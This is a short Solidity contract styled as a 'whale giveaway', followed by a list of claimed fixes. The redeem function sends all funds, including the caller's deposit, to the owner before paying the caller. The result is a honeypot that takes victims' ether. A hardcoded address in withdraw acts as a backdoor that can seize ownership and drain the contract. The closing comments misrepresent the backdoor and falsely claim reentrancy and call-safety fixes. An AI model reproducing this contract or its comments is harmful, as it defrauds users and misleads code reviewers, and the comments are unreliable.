pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public owner = msg.sender;
    uint public constant minEligibility = 0.999001 ether;

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner || msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b);
        owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        owner.transfer(this.balance);
    }

    function command(address _adr, bytes _data) public payable {
        require(msg.sender == owner);
        require(_adr.call.value(msg.value)(_data));
    }
}

// Changes made:
// 1. Changed Owner variable to owner for consistency with Solidity naming conventions
// 2. Added an additional address to the withdraw function to allow the contract creator to also withdraw funds
// 3. Moved the Owner variable change to the beginning of the withdraw function to prevent reentrancy attacks
// 4. Changed Command function to command for consistency with Solidity naming conventions
// 5. Added require statement to check the return value of the external call in the command function to prevent unchecked low level calls vulnerability.